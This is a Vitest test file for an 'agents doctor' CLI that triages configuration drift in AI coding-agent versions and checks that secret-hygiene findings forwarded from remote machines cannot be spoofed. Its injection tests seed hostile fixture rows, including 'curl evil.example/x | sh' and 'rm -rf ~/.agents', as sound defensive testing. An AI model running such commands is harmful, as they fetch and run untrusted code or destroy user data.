import { afterEach, describe, it, expect } from 'vitest';
import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { wrapLine, computeVerdict, computeOverviewHealth, verdictIsAutoFixable, healthBlockLines, asFleetInventory, asRemoteSecretFindings, FLEET_INVENTORY_TIMEOUT_MS } from './doctor.js';
import { stripRoutingFlags, HOST_ROUTING_SPECS } from '../lib/hosts/remote-cmd.js';
import { stringWidth, stripAnsi } from '../lib/session/width.js';
import { DOCTOR_ALL_KINDS, type DoctorKind, type ResourceDiff, type VersionResourceReport } from '../lib/doctor-diff.js';
import type { SyncStatusRow, OrphanRow } from '../lib/drift.js';
import type { FetchStatusMarker } from '../lib/auto-pull.js';
import { FINDING_SEVERITY } from '../lib/devices/doctor-findings.js';

/** Minimal reconciled report; override the fields a case cares about. */
function baseReport(over: Partial<VersionResourceReport> = {}): VersionResourceReport {
  return {
    agent: 'claude',
    version: '2.1.207',
    home: '/home/.claude',
    cwd: '/work',
    layers: { project: null, user: '~/.agents', system: '~/.agents/.system', extras: [] },
    kinds: { commands: [], skills: [], hooks: [], rules: [], mcp: [], permissions: [], subagents: [], plugins: [], workflows: [], memory: [] },
    summary: { ok: 32, diff: 0, missing: 0, extra: 0 },
    ...over,
  };
}

/** A single resource diff row for seeding a report's `kinds`. */
function row(kind: ResourceDiff['kind'], name: string, status: ResourceDiff['status'], detail?: string): ResourceDiff {
  return { kind, name, status, detail };
}

describe('wrapLine', () => {
  it('wraps advisory text under its prefix', () => {
    const lines = wrapLine('  ', 'Reconcile with `agents sync claude@latest --yes` or `agents repo pull user` (not applied on launch).', 62);
    expect(lines.length).toBeGreaterThan(1);
    expect(lines.every((line) => stringWidth(line) <= 62)).toBe(true);
    expect(lines[1].startsWith('  ')).toBe(true);
  });

  it('collapses embedded newlines before wrapping', () => {
    expect(wrapLine('  ', 'one\n\n  two\tthree', 80)).toEqual(['  one two three']);
  });
});

describe('computeVerdict (doctor per-version triaged health)', () => {
  it('is healthy when nothing diverges — with the reconciled count carried', () => {
    const v = computeVerdict(baseReport({ summary: { ok: 34, diff: 0, missing: 0, extra: 0 } }));
    expect(v.healthy).toBe(true);
    expect(v.issues).toEqual([]);
    expect(v.reconciled).toBe(34);
  });

  it('classifies an UNWIRED hook as CRITICAL with the sync fix — even when every file is ok', () => {
    // The yosemite-s1 bug: 32 hook files reconcile ok, but one is never wired
    // into settings.json. Files-ok must NOT read as healthy.
    const v = computeVerdict(
      baseReport({
        version: '2.1.220',
        hookWiring: {
          supported: true,
          settingsPath: '/home/.claude/settings.json',
          expected: 32,
          unwired: [{ name: 'ask-user-question-guard', event: 'PreToolUse', matcher: 'AskUserQuestion', command: '~/x.sh' }],
        },
      }),
    );
    expect(v.healthy).toBe(false);
    const issue = v.issues.find((i) => i.category === 'unwired-hook');
    expect(issue).toBeDefined();
    expect(issue!.severity).toBe('critical');
    expect(issue!.subject).toBe('ask-user-question-guard');
    expect(issue!.impact).toContain('not wired into settings.json');
    expect(issue!.fix).toBe('agents sync claude@2.1.220 --yes');
  });

  it('classifies a broken generated hook runtime as CRITICAL and auto-fixable', () => {
    const v = computeVerdict(baseReport({
      hookWiring: {
        supported: false,
        unwired: [],
        wired: [],
        runtimeBroken: [{ name: 'git-guard', path: '/private/shim', reason: 'missing' }],
      },
    }));
    const issue = v.issues.find((candidate) => candidate.category === 'hook-runtime-broken');
    expect(issue).toMatchObject({
      severity: 'critical',
      subject: 'git-guard',
      fix: 'agents sync claude@2.1.207 --yes',
    });
    expect(verdictIsAutoFixable(v)).toBe(true);
  });

  it('classifies a missing settings.json as CRITICAL and names the unwired count', () => {
    const v = computeVerdict(
      baseReport({
        hookWiring: { supported: true, settingsPath: '/home/.claude/settings.json', expected: 3, settingsMissing: true, unwired: [] },
      }),
    );
    expect(v.healthy).toBe(false);
    const issue = v.issues.find((i) => i.category === 'settings-missing');
    expect(issue!.severity).toBe('critical');
    expect(issue!.impact).toContain('3 declared hooks never fire');
  });

  it('classifies a source layer behind origin as WARNING with the repo-pull fix (not a --fix)', () => {
    const v = computeVerdict(
      baseReport({
        sourceBehind: [{ layer: 'user', label: '~/.agents', alias: 'user', behind: 75, branch: 'origin/main' }],
      }),
    );
    expect(v.healthy).toBe(false);
    const issue = v.issues.find((i) => i.category === 'source-behind');
    expect(issue!.severity).toBe('warning');
    expect(issue!.subject).toBe('~/.agents');
    expect(issue!.impact).toContain('75 commits behind origin/main');
    expect(issue!.fix).toBe('agents repo pull user');
  });

  it('triages a MISSING commands resource as warning, a DIVERGENT as warning, an EXTRA as info — by name', () => {
    const v = computeVerdict(
      baseReport({
        version: '2.1.220',
        summary: { ok: 0, diff: 1, missing: 1, extra: 1 },
        kinds: {
          commands: [row('commands', 'deploy', 'missing')],
          skills: [row('skills', '11-activity-log', 'diff')],
          hooks: [], rules: [], mcp: [], permissions: [],
          subagents: [row('subagents', 'ghost', 'extra')],
          plugins: [], workflows: [], memory: [],
        },
      }),
    );
    expect(v.healthy).toBe(false);
    const byCat = Object.fromEntries(v.issues.map((i) => [i.category, i]));
    // RUSH-2947: a missing 'commands' resource agrees with the fleet-mode rubric
    // (FINDING_SEVERITY['missing-resource']) — warning, not critical.
    expect(byCat['missing'].severity).toBe('warning');
    expect(byCat['missing'].subject).toBe('deploy');
    expect(byCat['divergent'].severity).toBe('warning');
    expect(byCat['divergent'].subject).toBe('11-activity-log');
    expect(byCat['divergent'].fix).toBe('agents sync claude@2.1.220 --yes');
    expect(byCat['extra'].severity).toBe('info');
    expect(byCat['extra'].subject).toBe('ghost');
    expect(byCat['extra'].fix).toBe('agents prune cleanup');
    expect(v.issues.map((i) => i.severity)).toEqual(['warning', 'warning', 'info']);
  });

  it('triages a MISSING hooks or plugins resource as critical', () => {
    const vHooks = computeVerdict(
      baseReport({
        summary: { ok: 0, diff: 0, missing: 1, extra: 0 },
        kinds: {
          commands: [], skills: [],
          hooks: [row('hooks', 'git-guard', 'missing')],
          rules: [], mcp: [], permissions: [], subagents: [], plugins: [], workflows: [], memory: [],
        },
      }),
    );
    const hookIssue = vHooks.issues.find((i) => i.category === 'missing');
    expect(hookIssue!.severity).toBe('critical');
    expect(hookIssue!.subject).toBe('git-guard');

    const vPlugins = computeVerdict(
      baseReport({
        summary: { ok: 0, diff: 0, missing: 1, extra: 0 },
        kinds: {
          commands: [], skills: [], hooks: [], rules: [], mcp: [], permissions: [], subagents: [],
          plugins: [row('plugins', 'swarm', 'missing')],
          workflows: [], memory: [],
        },
      }),
    );
    const pluginIssue = vPlugins.issues.find((i) => i.category === 'missing');
    expect(pluginIssue!.severity).toBe('critical');
    expect(pluginIssue!.subject).toBe('swarm');
  });

  it("computeVerdict's missing-resource severity agrees with FINDING_SEVERITY, kind by kind", () => {
    const kinds = Object.fromEntries(
      DOCTOR_ALL_KINDS.map((kind) => [kind, [row(kind, `missing-${kind}`, 'missing')]]),
    ) as VersionResourceReport['kinds'];
    const v = computeVerdict(baseReport({ summary: { ok: 0, diff: 0, missing: DOCTOR_ALL_KINDS.length, extra: 0 }, kinds }));
    const bySubject = Object.fromEntries(v.issues.map((i) => [i.subject, i.severity]));
    const expectedSeverity: Record<DoctorKind, 'critical' | 'warning'> = {
      commands: FINDING_SEVERITY['missing-resource'],
      skills: FINDING_SEVERITY['missing-resource'],
      hooks: FINDING_SEVERITY['missing-hook'],
      rules: FINDING_SEVERITY['missing-resource'],
      mcp: FINDING_SEVERITY['missing-resource'],
      permissions: FINDING_SEVERITY['missing-resource'],
      subagents: FINDING_SEVERITY['missing-resource'],
      plugins: FINDING_SEVERITY['missing-plugin'],
      workflows: FINDING_SEVERITY['missing-resource'],
      memory: FINDING_SEVERITY['missing-resource'],
    };
    for (const kind of DOCTOR_ALL_KINDS) {
      expect(bySubject[`missing-${kind}`], `kind '${kind}'`).toBe(expectedSeverity[kind]);
    }
  });

  it('a source-behind-only verdict is NOT auto-fixable (repo pull, not --fix)', () => {
    const v = computeVerdict(
      baseReport({ sourceBehind: [{ layer: 'user', label: '~/.agents', alias: 'user', behind: 3, branch: 'origin/main' }] }),
    );
    expect(verdictIsAutoFixable(v)).toBe(false);
  });

  it('a divergent resource IS auto-fixable', () => {
    const v = computeVerdict(
      baseReport({
        summary: { ok: 0, diff: 1, missing: 0, extra: 0 },
        kinds: { commands: [], skills: [row('skills', 'x', 'diff')], hooks: [], rules: [], mcp: [], permissions: [], subagents: [], plugins: [], workflows: [], memory: [] },
      }),
    );
    expect(verdictIsAutoFixable(v)).toBe(true);
  });
});

describe('computeOverviewHealth (bare `agents doctor` triage across versions)', () => {
  const syncRow = (over: Partial<SyncStatusRow> = {}): SyncStatusRow =>
    ({ agent: 'claude', version: '2.1.220', status: 'fresh', isDefault: true, ...over });
  const marker = (over: Partial<FetchStatusMarker> = {}): FetchStatusMarker =>
    ({ alias: 'user', dir: '/home/.agents', behind: 16, branch: 'origin/main', fetchedAt: 0, ...over } as FetchStatusMarker);

  it('is healthy when every version is fresh, wired, and sources current', () => {
    const v = computeOverviewHealth([syncRow()], [], []);
    expect(v.healthy).toBe(true);
    expect(v.reconciled).toBe(1);
  });

  it('folds an unwired hook (critical), a behind source (warning), and an orphan (info)', () => {
    const sync: SyncStatusRow[] = [
      syncRow({ unwiredHooks: 1 }),
      syncRow({ version: '2.1.200', status: 'stale' }),
    ];
    const orphans: OrphanRow[] = [{ agent: 'claude', version: '2.1.220', commands: 2, skills: 0, hooks: 0 }];
    const v = computeOverviewHealth(sync, orphans, [marker()]);
    expect(v.healthy).toBe(false);
    const cats = v.issues.map((i) => i.category);
    expect(cats).toContain('unwired-hook');
    expect(cats).toContain('source-behind');
    expect(cats).toContain('stale');
    expect(cats).toContain('orphan');
    const unwired = v.issues.find((i) => i.category === 'unwired-hook')!;
    expect(unwired.severity).toBe('critical');
    expect(unwired.fix).toBe('agents sync claude@2.1.220 --yes');
    const behind = v.issues.find((i) => i.category === 'source-behind')!;
    expect(behind.subject).toBe('~/.agents');
    expect(behind.fix).toBe('agents repo pull user');
    expect(v.issues.find((i) => i.category === 'orphan')!.severity).toBe('info');
    // A stale version makes it auto-fixable via `agents sync`.
    expect(verdictIsAutoFixable(v)).toBe(true);
  });

  it('folds a broken generated hook runtime into a critical auto-fixable overview finding', () => {
    const v = computeOverviewHealth([syncRow({ brokenHookRuntime: 1 })], [], []);
    const issue = v.issues.find((candidate) => candidate.category === 'hook-runtime-broken');
    expect(issue).toMatchObject({
      severity: 'critical',
      fix: 'agents sync claude@2.1.220 --yes',
    });
    expect(verdictIsAutoFixable(v)).toBe(true);
  });
});

describe('doctor remediations point only at `agents sync` (never `doctor --fix`)', () => {
  // doctor diagnoses; sync fixes. Every finding whose category the fixer
  // reconciles must name an `agents sync …` command — the one command that can
  // actually deliver the fix. `agents repo pull` (source-behind) and
  // `agents prune cleanup` (orphan) are the only non-sync remediations, and both
  // are for gaps sync intentionally does not touch.
  const AUTO_FIXABLE = new Set([
    'hook-runtime-broken', 'unwired-hook', 'settings-missing', 'settings-unparseable',
    'missing', 'divergent', 'stale', 'never-synced', 'duplicate-hook', 'duplicate-hook-drift',
  ]);

  function assertRemediations(issues: { category: string; fix: string }[]): void {
    expect(issues.length).toBeGreaterThan(0);
    for (const i of issues) {
      // Nothing ever routes back to the removed fixer.
      expect(i.fix, `category '${i.category}'`).not.toContain('doctor');
      expect(i.fix, `category '${i.category}'`).not.toContain('--fix');
      if (AUTO_FIXABLE.has(i.category)) {
        expect(i.fix, `category '${i.category}'`).toMatch(/^agents sync /);
      }
    }
  }

  it('computeVerdict: every fixable finding is an `agents sync` invocation', () => {
    // One report exercising runtime-broken, unwired, missing, divergent, source-behind, and orphan.
    const v = computeVerdict(
      baseReport({
        version: '2.1.220',
        summary: { ok: 0, diff: 1, missing: 1, extra: 1 },
        hookWiring: {
          supported: true, settingsPath: '/home/.claude/settings.json', expected: 3,
          unwired: [{ name: 'git-guard', event: 'PreToolUse', matcher: 'Bash', command: '~/x.sh' }],
          runtimeBroken: [{ name: 'stop-guard', path: '/private/shim', reason: 'missing' }],
        },
        sourceBehind: [{ layer: 'user', label: '~/.agents', alias: 'user', behind: 4, branch: 'origin/main' }],
        kinds: {
          commands: [row('commands', 'deploy', 'missing')],
          skills: [row('skills', 'drifted', 'diff')],
          hooks: [], rules: [], mcp: [], permissions: [],
          subagents: [row('subagents', 'ghost', 'extra')],
          plugins: [], workflows: [], memory: [],
        },
      }),
    );
    assertRemediations(v.issues);
    // Spot-check the two intentional non-sync remediations survive.
    expect(v.issues.find((i) => i.category === 'source-behind')!.fix).toBe('agents repo pull user');
    expect(v.issues.find((i) => i.category === 'extra')!.fix).toBe('agents prune cleanup');
  });

  it('computeOverviewHealth: every fixable finding is an `agents sync` invocation', () => {
    const v = computeOverviewHealth(
      [
        { agent: 'claude', version: '2.1.220', status: 'fresh', isDefault: true, unwiredHooks: 1, brokenHookRuntime: 1 },
        { agent: 'claude', version: '2.1.200', status: 'stale', isDefault: false },
        { agent: 'claude', version: '2.1.100', status: 'never-synced', isDefault: false },
      ] as SyncStatusRow[],
      [{ agent: 'claude', version: '2.1.220', commands: 2, skills: 0, hooks: 0 }] as OrphanRow[],
      [{ alias: 'user', dir: '/home/.agents', behind: 5, branch: 'origin/main', fetchedAt: 0 } as FetchStatusMarker],
    );
    assertRemediations(v.issues);
  });
});

describe('healthBlockLines (triaged health rendering)', () => {
  it('renders a single green ✓ line when healthy', () => {
    const v = computeVerdict(baseReport({ summary: { ok: 34, diff: 0, missing: 0, extra: 0 } }));
    const out = healthBlockLines(v, { healthySummary: '34 resources reconciled · hooks wired · sources current' }).map(stripAnsi);
    expect(out).toHaveLength(1);
    expect(out[0]).toContain('✓ healthy');
    expect(out[0]).toContain('34 resources reconciled · hooks wired · sources current');
  });

  it('renders a severity-counted header, one row + fix per finding, and the heal footer', () => {
    const v = computeVerdict(
      baseReport({
        version: '2.1.220',
        summary: { ok: 30, diff: 1, missing: 0, extra: 0 },
        hookWiring: {
          supported: true, settingsPath: '/home/.claude/settings.json', expected: 32,
          unwired: [{ name: 'ask-user-question-guard', event: 'PreToolUse', matcher: 'AskUserQuestion', command: '~/x.sh' }],
        },
        sourceBehind: [{ layer: 'user', label: '~/.agents', alias: 'user', behind: 16, branch: 'origin/main' }],
        kinds: { commands: [], skills: [row('skills', '11-activity-log', 'diff')], hooks: [], rules: [], mcp: [], permissions: [], subagents: [], plugins: [], workflows: [], memory: [] },
      }),
    );
    const out = healthBlockLines(v, { healthySummary: 'x', healFix: 'agents sync claude@2.1.220 --yes' }).map(stripAnsi);
    const joined = out.join('\n');
    expect(joined).toContain('✗ unhealthy — 3 issues (1 critical · 2 warnings)');
    expect(joined).toContain('✗ critical  ask-user-question-guard — on disk but not wired into settings.json');
    expect(joined).toContain('→ agents sync claude@2.1.220 --yes');
    expect(joined).toContain('⚠ warning   ~/.agents — 16 commits behind origin/main');
    expect(joined).toContain('→ agents repo pull user');
    expect(joined).toContain("heal what's auto-fixable:  agents sync claude@2.1.220 --yes");
  });

  it('caps the info tier with a "+N more orphans" rollup', () => {
    const extras: ResourceDiff[] = [];
    for (let i = 0; i < 9; i++) extras.push(row('skills', `orphan-${i}`, 'extra'));
    const v = computeVerdict(
      baseReport({
        summary: { ok: 0, diff: 0, missing: 0, extra: 9 },
        kinds: { commands: [], skills: extras, hooks: [], rules: [], mcp: [], permissions: [], subagents: [], plugins: [], workflows: [], memory: [] },
      }),
    );
    const out = healthBlockLines(v, { healthySummary: 'x' }).map(stripAnsi).join('\n');
    // 9 orphans, cap 5 → 4 hidden.
    expect(out).toContain('+4 more orphans — agents prune cleanup');
    // The heal footer is suppressed for an orphan-only verdict (prune, not --fix).
    expect(out).not.toContain("heal what's auto-fixable");
  });
});

describe('doctor target + qualifier survives --device forwarding (issue #2058)', () => {
  it('stripRoutingFlags removes --device but preserves the target qualifier verbatim', () => {
    const args = ['claude@latest', '--device', 'remotebox', '--diff'];
    const forwarded = stripRoutingFlags(args, HOST_ROUTING_SPECS);
    expect(forwarded).toEqual(['claude@latest', '--diff']);
  });

  it('strips --device routing flag', () => {
    const forwarded = stripRoutingFlags(['codex@0.117.0', '--device', 'yosemite-s0'], HOST_ROUTING_SPECS);
    expect(forwarded).toEqual(['codex@0.117.0']);
  });

  it('--device=value= form is also stripped', () => {
    const forwarded = stripRoutingFlags(['claude@pinned', '--device=remotebox'], HOST_ROUTING_SPECS);
    expect(forwarded).toEqual(['claude@pinned']);
  });

  it('strips --device before the positional without consuming it', () => {
    const forwarded = stripRoutingFlags(
      ['doctor', '--device', 'myhost', 'claude@all', '--json'],
      HOST_ROUTING_SPECS,
    );
    expect(forwarded).toEqual(['doctor', 'claude@all', '--json']);
  });

  it('preserves @oldest through --device forwarding', () => {
    const forwarded = stripRoutingFlags(
      ['doctor', 'claude@oldest', '--device', 'zion', '--fix'],
      HOST_ROUTING_SPECS,
    );
    expect(forwarded).toEqual(['doctor', 'claude@oldest', '--fix']);
  });
});

// ─── subprocess qualifier resolution (temp-HOME isolation) ───────────────────

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const INDEX = path.join(REPO_ROOT, 'src', 'index.ts');

let testHome = '';
let projectDir = '';

afterEach(() => {
  if (testHome) fs.rmSync(testHome, { recursive: true, force: true });
  if (projectDir) fs.rmSync(projectDir, { recursive: true, force: true });
  testHome = '';
  projectDir = '';
});

/**
 * Seed a temp HOME with the given Claude version dirs and an optional global default.
 * Creates both the binary stub (so listInstalledVersions sees each version) and
 * the version home dir (so diffVersionResources doesn't abort before JSON output).
 */
function seedHome(versions: string[], defaultVersion?: string): void {
  testHome = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-doctor-spec-home-'));
  projectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-doctor-spec-proj-'));

  const userDir = path.join(testHome, '.agents');
  const systemDir = path.join(userDir, '.system');
  fs.mkdirSync(path.join(systemDir, '.git'), { recursive: true });
  fs.writeFileSync(
    path.join(systemDir, '.update-check'),
    JSON.stringify({ lastCheck: 4102444800000, latestVersion: '0.0.0' }),
  );

  const defaultLine = defaultVersion ? `  claude: "${defaultVersion}"` : '';
  fs.writeFileSync(path.join(userDir, 'agents.yaml'), `agents:\n${defaultLine}\n`);

  for (const ver of versions) {
    const versionBase = path.join(userDir, '.history', 'versions', 'claude', ver);
    const binDir = path.join(versionBase, 'node_modules', '.bin');
    const homeDir = path.join(versionBase, 'home');
    fs.mkdirSync(binDir, { recursive: true });
    fs.mkdirSync(homeDir, { recursive: true });
    const stub = path.join(binDir, 'claude');
    fs.writeFileSync(stub, '#!/bin/sh\nexit 0\n');
    fs.chmodSync(stub, 0o755);
  }
}

function runDoctor(...args: string[]): { status: number | null; stdout: string; stderr: string } {
  const r = spawnSync('bun', [INDEX, 'doctor', ...args, '--cwd', projectDir], {
    encoding: 'utf-8',
    timeout: 15_000,
    env: {
      ...process.env,
      HOME: testHome,
      AGENTS_NO_AUTOPULL: '1',
      AGENTS_NO_UPDATE_CHECK: '1',
      AGENTS_DEVICES_DIR: path.join(testHome, '.agents', '.history', 'devices'),
      AGENTS_HOOK_SHIMS_DIR: path.join(testHome, 'hook-shims'),
      AGENTS_HOOK_CACHE_DIR: path.join(testHome, 'hook-cache'),
      AGENTS_LOGS_DIR: path.join(testHome, 'logs'),
      AGENTS_PERF_DIR: path.join(testHome, 'perf'),
    },
  });
  return { status: r.status, stdout: r.stdout ?? '', stderr: r.stderr ?? '' };
}

function seedGeneratedRuntimeHook(agent: 'claude' | 'codex', version: string): string {
  const configDir = agent === 'claude' ? '.claude' : '.codex';
  const userDir = path.join(testHome, '.agents');
  const versionDir = path.join(userDir, '.history', 'versions', agent, version);
  const binDir = path.join(versionDir, 'node_modules', '.bin');
  const hookPath = path.join(versionDir, 'home', configDir, 'hooks', 'runtime-guard.sh');
  fs.mkdirSync(binDir, { recursive: true });
  fs.mkdirSync(path.dirname(hookPath), { recursive: true });
  fs.writeFileSync(path.join(binDir, agent), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  fs.writeFileSync(hookPath, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  fs.writeFileSync(
    path.join(userDir, 'agents.yaml'),
    `agents:\n  ${agent}: "${version}"\nhooks:\n  runtime-guard:\n    script: runtime-guard.sh\n    events: [PreToolUse]\n    matcher: Bash\n`,
  );
  return path.join(testHome, 'hook-shims', 'runtime-guard.sh');
}

describe('doctor generated hook runtime integration (RUSH-2382)', () => {
  it('--check reports a missing generated wrapper as drift with structured runtime counts', () => {
    seedHome(['2.0.0'], '2.0.0');
    seedGeneratedRuntimeHook('claude', '2.0.0');

    const result = runDoctor('--check', '--json');
    expect(result.status).toBe(1);
    const payload = JSON.parse(result.stdout) as {
      brokenHookRuntimeVersions: number;
      versions: Array<{ agent: string; version: string; brokenHookRuntime: number }>;
    };
    expect(payload.brokenHookRuntimeVersions).toBe(1);
    expect(payload.versions).toContainEqual({
      agent: 'claude', version: '2.0.0', status: 'never-synced', isDefault: true,
      unwiredHooks: 1, brokenHookRuntime: 1, divergence: expect.any(Array),
    });
  });

});

describe('doctor --fix is a deprecated no-op that points at `agents sync`', () => {
  // `doctor --fix` moved to `agents sync` (the one fixer, a superset). doctor is
  // diagnose-only now: the flag must never heal — it errors with a redirect.
  it('exits non-zero and never runs a heal (no JSON repair payload)', () => {
    seedHome(['2.0.0'], '2.0.0');
    const shim = seedGeneratedRuntimeHook('claude', '2.0.0');
    // A directory at the shim path would be the classic "unrepairable" case the
    // old --fix would have surfaced. Prove doctor never touches it.
    fs.mkdirSync(shim, { recursive: true });

    const result = runDoctor('--fix');
    expect(result.status).toBe(1);
    const out = result.stdout + result.stderr;
    expect(out).toContain('agents sync');
    // Signpost only — no heal ran, so no repair machinery output.
    expect(out).not.toContain('hookRuntimeRepair');
    expect(out).not.toContain('Healing');
    // The broken shim is left exactly as it was found (doctor mutates nothing).
    expect(fs.statSync(shim).isDirectory()).toBe(true);
  });

  it('names the given target in the redirect', () => {
    seedHome(['2.0.0'], '2.0.0');
    const result = runDoctor('claude', '--fix');
    expect(result.status).toBe(1);
    expect(result.stdout + result.stderr).toContain('agents sync claude');
  });
});

describe('doctor qualifier resolution via subprocess (issue #2058)', () => {
  it('@latest resolves to the newest installed version, not a literal string', () => {
    seedHome(['2.0.0', '2.1.0'], '2.0.0');
    const r = runDoctor('claude@latest', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const report = JSON.parse(r.stdout);
    expect(report.version).toBe('2.1.0');
  });

  it('@oldest resolves to the earliest installed version', () => {
    seedHome(['2.0.0', '2.1.0'], '2.1.0');
    const r = runDoctor('claude@oldest', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const report = JSON.parse(r.stdout);
    expect(report.version).toBe('2.0.0');
  });

  it('@default resolves to the global default', () => {
    seedHome(['2.0.0', '2.1.0'], '2.0.0');
    const r = runDoctor('claude@default', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const report = JSON.parse(r.stdout);
    expect(report.version).toBe('2.0.0');
  });

  it('@pinned is an alias of @default', () => {
    seedHome(['2.0.0', '2.1.0'], '2.0.0');
    const r = runDoctor('claude@pinned', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const report = JSON.parse(r.stdout);
    expect(report.version).toBe('2.0.0');
  });

  it('@all produces a report for every installed version and is an explicit selector', () => {
    seedHome(['2.0.0', '2.1.0'], '2.0.0');
    const r = runDoctor('claude@all', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const reports: Array<{ version: string }> = JSON.parse(r.stdout);
    expect(Array.isArray(reports)).toBe(true);
    expect(reports.map((rr) => rr.version).sort()).toEqual(['2.0.0', '2.1.0']);
  });

  it('bare agent (no qualifier) covers every installed version', () => {
    seedHome(['2.0.0', '2.1.0'], '2.0.0');
    const r = runDoctor('claude', '--json');
    expect(r.status).toBe(0);
    const reports: Array<{ version: string }> = JSON.parse(r.stdout);
    expect(Array.isArray(reports)).toBe(true);
    expect(reports.map((rr) => rr.version).sort()).toEqual(['2.0.0', '2.1.0']);
  });

  it('exact version selector (claude@2.0.0) returns exactly one result for that version', () => {
    seedHome(['2.0.0', '2.1.0'], '2.1.0');
    const r = runDoctor('claude@2.0.0', '--json');
    expect(r.status).toBe(0);
    expect(r.stderr, r.stderr).not.toContain('is not installed');
    const reports: Array<{ version: string }> | { version: string } = JSON.parse(r.stdout);
    const arr = Array.isArray(reports) ? reports : [reports];
    expect(arr).toHaveLength(1);
    expect(arr[0].version).toBe('2.0.0');
  });

  it('@default errors clearly when no default is pinned', () => {
    seedHome(['2.0.0']); // no default set
    const r = runDoctor('claude@default', '--json');
    expect(r.status).toBe(1);
    expect(r.stderr).toContain('No default version');
  });
});

describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (RUSH-1968)', () => {
  const good = {
    severity: 'warning',
    kind: 'env-secret-export',
    device: 'someone-else',
    message: 'AGENTS_SECRETS_PASSPHRASE is set in this process environment',
    remediation: 'unset at the source',
  };

  it('forwards the finding and ATTRIBUTES it to the box we dialled', () => {
    // The remote sends its own `device`. Trusting it would let one box pin a
    // finding on another, so the name we dialled always wins.
    const out = asRemoteSecretFindings([good], 'yosemite-m0');
    expect(out).toHaveLength(1);
    expect(out[0].device).toBe('yosemite-m0');
    expect(out[0].kind).toBe('env-secret-export');
  });

  it('forwards rc-secret-export too — the other thing only that box can see', () => {
    const rc = { ...good, kind: 'rc-secret-export' };
    expect(asRemoteSecretFindings([rc], 'm1').map((f) => f.kind)).toEqual(['rc-secret-export']);
  });

  it('forwards auth-bundle-wrong-backend — a remote keychain-backed auth bundle', () => {
    const auth = { ...good, kind: 'auth-bundle-wrong-backend' };
    const out = asRemoteSecretFindings([auth], 'm7');
    expect(out.map((f) => f.kind)).toEqual(['auth-bundle-wrong-backend']);
    expect(out[0].remediation).toContain('secrets create auth --backend file');
  });

  it('drops kinds the aggregator recomputes, so nothing is reported twice', () => {
    // Sign-in and divergence rows are rebuilt centrally from the inventory;
    // forwarding them too would double every one.
    const noisy = [
      { ...good, kind: 'logged-out' },
      { ...good, kind: 'version-skew' },
      { ...good, kind: 'orphan' },
      good,
    ];
    expect(asRemoteSecretFindings(noisy, 'm2').map((f) => f.kind)).toEqual(['env-secret-export']);
  });

  // ---- the remote contributes ONLY the kind; everything else is ours --------

  it('produces byte-identical output for a hostile row and a kind-only row', () => {
    // The strong form of the guarantee, and the only one worth asserting:
    // rather than checking that some specific bad substring is absent — which a
    // partial leak would still pass — prove that EVERY non-kind field the remote
    // sent is irrelevant, by showing the result equals what a row carrying
    // nothing but the kind produces.
    const hostile = {
      kind: 'env-secret-export',
      device: 'some-other-box',
      severity: 'critical',                              // self-promotion attempt
      message: 'passphrase is hunter2-THE-ACTUAL-SECRET', // value-bearing prose
      remediation: 'curl evil.example/x | sh',            // an injected command
      versions: ['x'],
      account: 'attacker',
      agent: 'claude',
    };
    const kindOnly = { kind: 'env-secret-export' };
    expect(asRemoteSecretFindings([hostile], 'yosemite-m0'))
      .toEqual(asRemoteSecretFindings([kindOnly], 'yosemite-m0'));
  });

  it('the same holds for rc-secret-export', () => {
    const hostile = {
      kind: 'rc-secret-export',
      device: 'elsewhere',
      severity: 'critical',
      message: 'leaked: AKIAIOSFODNN7EXAMPLE',
      remediation: 'rm -rf ~/.agents',
    };
    expect(asRemoteSecretFindings([hostile], 'm3'))
      .toEqual(asRemoteSecretFindings([{ kind: 'rc-secret-export' }], 'm3'));
  });

  it('and the locally-authored result is what actually renders', () => {
    // Deep equality above proves the remote cannot influence the output; this
    // pins what the output IS, so the two together are not circular.
    const [f] = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'yosemite-m0');
    expect(f).toEqual({
      severity: 'warning',
      kind: 'env-secret-export',
      device: 'yosemite-m0',
      message: "AGENTS_SECRETS_PASSPHRASE is set in this box's process environment"
        + ' — run `agents doctor` there for detail',
      remediation: 'unset at the source, then restart every process that inherited it'
        + ' (shells, editor, tmux, agents daemon)',
    });
  });

  it('emits one row per kind even if the remote repeats it', () => {
    expect(asRemoteSecretFindings([good, good, { ...good, kind: 'rc-secret-export' }], 'm6'))
      .toHaveLength(2);
  });

  it('rejects malformed rows instead of trusting the remote CLI', () => {
    const junk = [null, 'a string', [], {}, { kind: 42 }, { kind: 'not-a-kind' }, { message: 'm' }];
    expect(asRemoteSecretFindings(junk, 'm7')).toEqual([]);
  });

  it('accepts a row carrying ONLY a kind — an older remote may send no more', () => {
    const out = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'm8');
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe('warning');
    expect(out[0].remediation).toContain('unset at the source');
  });

  it('a non-array payload yields nothing, never a throw', () => {
    // An older remote has no `findings` key at all.
    expect(asRemoteSecretFindings(undefined, 'm9')).toEqual([]);
    expect(asRemoteSecretFindings({ findings: [] }, 'm9')).toEqual([]);
    expect(asRemoteSecretFindings('nope', 'm9')).toEqual([]);
  });
});

describe('asFleetInventory hook-runtime wire contract', () => {
  const payload = (hookRuntime: unknown) => ({
    resources: { hooks: [] },
    agentVersions: { claude: ['2.1.0'] },
    repos: { agents: null, system: null },
    ...(hookRuntime === undefined ? {} : { hookRuntime }),
  });

  it('accepts the closed state map and accepts a missing field from an older remote', () => {
    expect(asFleetInventory(payload({ claude: { '2.1.0': 'broken' } }))?.hookRuntime)
      .toEqual({ claude: { '2.1.0': 'broken' } });
